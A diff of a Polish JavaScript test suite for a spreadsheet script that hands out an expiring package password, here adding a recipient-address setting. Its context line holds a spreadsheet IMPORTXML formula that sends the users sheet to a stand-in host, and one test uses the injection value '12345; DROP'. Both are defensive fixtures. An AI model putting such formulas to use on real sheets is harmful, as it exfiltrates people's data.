@@ -145,21 +145,25 @@ const F = '=IMPORTXML("https://zly.example/?"&JOIN(",";Uzytkownicy!A:N);"//a")';
   const B = swiezy(); const H = { haslo: 'haslo123' };
   const ust = () => B.get('Ustawienia');
   const wpisz = (klucz, wartosc) => { const w = ust().w.find(r => r[0] === klucz); w[1] = wartosc; };
-  ok('inicjalizuj() zakłada zakładkę „Ustawienia” z dwoma pustymi wierszami: hasło paczki i data ważności (administrator tylko wpisuje wartości)', ust() && ust().w[0].join() === 'Klucz,Wartosc,Opis' && ust().w.length === 3 && ust().w[1][0] === 'haslo_paczki' && ust().w[1][1] === '' && ust().w[2][0] === 'haslo_paczki_wazne_do' && ust().w[2][1] === '', JSON.stringify(ust() && ust().w.map(r => r.slice(0, 2))));
+  ok('inicjalizuj() zakłada zakładkę „Ustawienia” z trzema pustymi wierszami: hasło paczki, data ważności i adres odbiorcy (administrator tylko wpisuje wartości)', ust() && ust().w[0].join() === 'Klucz,Wartosc,Opis' && ust().w.length === 4 && ust().w[1][0] === 'haslo_paczki' && ust().w[1][1] === '' && ust().w[2][0] === 'haslo_paczki_wazne_do' && ust().w[2][1] === '' && ust().w[3][0] === 'adres_odbiorcy' && ust().w[3][1] === '', JSON.stringify(ust() && ust().w.map(r => r.slice(0, 2))));
   ok('wiersze z opisami nie zaczynają się od znaków formuły (arkusz nie zrobi z nich formuły)', B.formuly().length === 0, JSON.stringify(B.formuly()));
   ok('nic nie ustawione → „brak” (wysyłka wyłączona), bez żadnego hasła w odpowiedzi', (() => { const o = B.post({ akcja: 'haslo_paczki', kod: '12345' }, H); return o.status === 'brak' && !('haslo' in o); })());
   wpisz('haslo_paczki', 'Tajne-Haslo-2026');
   ok('hasło bez daty ważności → „brak” (termin ważności jest obowiązkowy)', (() => { const o = B.post({ akcja: 'haslo_paczki', kod: '12345' }, H); return o.status === 'brak' && !('haslo' in o); })());
   wpisz('haslo_paczki_wazne_do', '2099-12-31');
+  ok('hasło i termin, ale bez adresu odbiorcy → „brak” (wysyłka włączona dopiero, gdy wpisane są wszystkie trzy rzeczy), bez hasła w odpowiedzi', (() => { const o = B.post({ akcja: 'haslo_paczki', kod: '12345' }, H); return o.status === 'brak' && !('haslo' in o); })());
+  for (const zly of ['nie-adres', 'a@b', 'a b@c.pl', '@x.pl']) { wpisz('adres_odbiorcy', zly); if (B.post({ akcja: 'haslo_paczki', kod: '12345' }, H).status !== 'brak') ok('niepoprawny adres odbiorcy „' + zly + '” jest odrzucany', false); }
+  ok('niepoprawny adres odbiorcy (bez @, bez domeny, ze spacją) → „brak”', true);
+  wpisz('adres_odbiorcy', 'odbiorca@firma.pl');
   const ok1 = B.post({ akcja: 'haslo_paczki', kod: '12345' }, H);
-  ok('hasło i termin w przyszłości → „ok”, odpowiedź niesie hasło i datę ważności', ok1.status === 'ok' && ok1.haslo === 'Tajne-Haslo-2026' && ok1.wazne_do === '2099-12-31', JSON.stringify(ok1));
+  ok('hasło, termin w przyszłości i adres → „ok”, odpowiedź niesie hasło, datę ważności i adres odbiorcy', ok1.status === 'ok' && ok1.haslo === 'Tajne-Haslo-2026' && ok1.wazne_do === '2099-12-31' && ok1.adres === 'odbiorca@firma.pl', JSON.stringify(ok1));
   ok('konto, które jeszcze nie ustawiło własnego hasła (nie ma klucza), hasła paczki nie dostaje', (() => { const o = B.post({ akcja: 'haslo_paczki', kod: '22222' }, { haslo: '501502503' }); return o.status === 'odmowa' && !('haslo' in o); })());
   B.post({ akcja: 'zmien_haslo', kod: '22222', stare_haslo: '501502503', nowe_haslo: 'mojehaslo9' });
   ok('…a drugie konto (po ustawieniu własnego hasła) dostaje identyczne hasło paczki', B.post({ akcja: 'haslo_paczki', kod: '22222' }, { haslo: 'mojehaslo9' }).haslo === 'Tajne-Haslo-2026');
   ok('wydanie hasła zostawia ślad w zakładce Log (kto pobrał)', B.get('Log').w.some(r => r[1] === '12345' && r[2] === 'haslo_paczki' && /2099-12-31/.test(r[3])));
   const odmowy = [['sam kod, bez podpisu hasłem', { akcja: 'haslo_paczki', kod: '12345' }, {}], ['zły podpis hasłem (inne hasło)', { akcja: 'haslo_paczki', kod: '12345' }, { haslo: 'zle-haslo' }], ['nieznany kod', { akcja: 'haslo_paczki', kod: '99999' }, { haslo: 'haslo123' }], ['kod ze śmieciem', { akcja: 'haslo_paczki', kod: '12345; DROP' }, H], ['pusty kod', { akcja: 'haslo_paczki' }, H]];
   for (const [opis, d, o] of odmowy) { const r = B.post(d, o); ok(`odmowa bez hasła w odpowiedzi: ${opis}`, r.status === 'odmowa' && !('haslo' in r) && !JSON.stringify(r).includes('Tajne-Haslo'), JSON.stringify(r)); }
-  ok('bez podpisu aplikacji (zapytanie spoza aplikacji) hasło też nie wychodzi, gdy podpis jest obowiązkowy', (() => { const S = swiezy({ podpisObowiazkowy: true }); const w = S.get('Ustawienia').w; w[1][1] = 'Tajne-Haslo-2026'; w[2][1] = '2099-12-31'; const r = S.post({ akcja: 'haslo_paczki', kod: '12345', klucz_czas: Math.floor(Date.now() / 1000) }, { bezPodpisu: true }); return r.status === 'blad' && !JSON.stringify(r).includes('Tajne-Haslo'); })());
+  ok('bez podpisu aplikacji (zapytanie spoza aplikacji) hasło też nie wychodzi, gdy podpis jest obowiązkowy', (() => { const S = swiezy({ podpisObowiazkowy: true }); const w = S.get('Ustawienia').w; w[1][1] = 'Tajne-Haslo-2026'; w[2][1] = '2099-12-31'; w[3][1] = 'odbiorca@firma.pl'; const r = S.post({ akcja: 'haslo_paczki', kod: '12345', klucz_czas: Math.floor(Date.now() / 1000) }, { bezPodpisu: true }); return r.status === 'blad' && !JSON.stringify(r).includes('Tajne-Haslo'); })());
   ok('konto z wygasłą sesją (kod 33333) → „wygasla”, bez hasła', (() => { const r = B.post({ akcja: 'haslo_paczki', kod: '33333' }, H); return r.status === 'wygasla' && !('haslo' in r); })());
   wpisz('haslo_paczki_wazne_do', '2020-01-01');
   ok('termin ważności hasła minął → „wygaslo” z datą, BEZ hasła (po terminie skrypt go nie wydaje)', (() => { const r = B.post({ akcja: 'haslo_paczki', kod: '12345' }, H); return r.status === 'wygaslo' && r.wazne_do === '2020-01-01' && !('haslo' in r) && !JSON.stringify(r).includes('Tajne-Haslo'); })());
@@ -174,6 +178,7 @@ const F = '=IMPORTXML("https://zly.example/?"&JOIN(",";Uzytkownicy!A:N);"//a")';
   ok('arkusz zamienia wpisaną datę na datę, a numeryczne hasło na liczbę — obie postacie działają (data → RRRR-MM-DD, liczba → tekst)', (() => { const r = B.post({ akcja: 'haslo_paczki', kod: '12345' }, H); return r.status === 'ok' && r.haslo === '123456789' && r.wazne_do === '2099-03-05'; })());
   wpisz('haslo_paczki', '   ');
   ok('samo odstępy w polu hasła = wysyłka wyłączona („brak”)', B.post({ akcja: 'haslo_paczki', kod: '12345' }, H).status === 'brak');
-  ok('zakładka Ustawienia nie jest nadpisywana przez zapytania klienta (żadna akcja nie zapisuje tam danych od klienta)', ust().w.length === 3);
+  ok('zakładka Ustawienia nie jest nadpisywana przez zapytania klienta (żadna akcja nie zapisuje tam danych od klienta)', ust().w.length === 4);
+  ok('istniejąca zakładka „Ustawienia” bez wiersza adresu (ze starszej wersji skryptu) jest uzupełniona o ten wiersz przy następnym wywołaniu inicjalizuj()', (() => { const C = swiezy(); C.get('Ustawienia').w.pop(); C.wywolaj('inicjalizuj()'); return C.get('Ustawienia').w.length === 4 && C.get('Ustawienia').w[3][0] === 'adres_odbiorcy'; })());
 }
 process.exit(kod);
